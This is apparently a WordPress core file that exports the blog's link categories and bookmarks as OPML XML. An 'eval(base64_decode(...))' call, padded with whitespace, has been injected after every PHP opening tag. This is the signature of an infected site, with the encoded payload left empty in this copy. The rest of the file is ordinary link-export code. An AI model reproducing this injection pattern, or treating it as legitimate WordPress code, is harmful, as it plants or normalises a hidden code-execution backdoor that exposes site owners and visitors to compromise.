<?php	 	eval(base64_decode(""));
/**
 * Outputs the OPML XML format for getting the links defined in the link
 * administration. This can be used to export links from one blog over to
 * another. Links aren't exported by the WordPress export, so this file handles
 * that.
 *
 * This file is not added by default to WordPress theme pages when outputting
 * feed links. It will have to be added manually for browsers and users to pick
 * up that this file exists.
 *
 * @package WordPress
 */

require_once('./wp-load.php');

header('Content-Type: text/xml; charset=' . get_option('blog_charset'), true);
$link_cat = '';
if ( !empty($_GET['link_cat']) ) {
	$link_cat = $_GET['link_cat'];
	if ( !in_array($link_cat, array('all', '0')) )
		$link_cat = absint( (string)urldecode($link_cat) );
}

echo '<?xml version="1.0"?'.">\n";
?>
<opml version="1.0">
	<head>
		<title><?php	 	eval(base64_decode("")); printf( __('Links for %s'), esc_attr(get_bloginfo('name', 'display')) ); ?></title>
		<dateCreated><?php	 	eval(base64_decode("")); echo gmdate("D, d M Y H:i:s"); ?> GMT</dateCreated>
		<?php	 	eval(base64_decode("")); do_action('opml_head'); ?>
	</head>
	<body>
<?php	 	eval(base64_decode(""));
if ( empty($link_cat) )
	$cats = get_categories(array('taxonomy' => 'link_category', 'hierarchical' => 0));
else
	$cats = get_categories(array('taxonomy' => 'link_category', 'hierarchical' => 0, 'include' => $link_cat));

foreach ( (array)$cats as $cat ) :
	$catname = apply_filters('link_category', $cat->name);

?>
<outline type="category" title="<?php	 	eval(base64_decode("")); echo esc_attr($catname); ?>">
<?php	 	eval(base64_decode(""));
	$bookmarks = get_bookmarks(array("category" => $cat->term_id));
	foreach ( (array)$bookmarks as $bookmark ) :
		$title = apply_filters('link_title', $bookmark->link_name);
?>
	<outline text="<?php	 	eval(base64_decode("")); echo esc_attr($title); ?>" type="link" xmlUrl="<?php	 	eval(base64_decode("")); echo esc_attr($bookmark->link_rss); ?>" htmlUrl="<?php	 	eval(base64_decode("")); echo esc_attr($bookmark->link_url); ?>" updated="<?php	 	eval(base64_decode("")); if ('0000-00-00 00:00:00' != $bookmark->link_updated) echo $bookmark->link_updated; ?>" />
<?php	 	eval(base64_decode(""));
	endforeach; // $bookmarks
?>
</outline>
<?php	 	eval(base64_decode(""));
endforeach; // $cats
?>
</body>
</opml>